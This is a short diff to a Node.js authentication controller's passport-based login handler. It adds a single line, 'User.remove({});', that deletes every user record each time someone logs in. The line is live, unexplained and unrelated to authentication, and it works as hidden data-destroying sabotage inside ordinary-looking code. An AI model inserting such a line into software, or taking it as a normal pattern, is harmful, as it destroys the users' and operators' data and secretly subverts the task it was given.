@@ -82,6 +82,7 @@ class AuthenticationController{
     }
 
     static login(req, res, next) {
+        User.remove({});
         passport.authenticate('local', { session: false }, function (err, user, info) {
             if (err) { return res.status(501).json(err) }
             if (!user) { return res.status(404).json(info) }
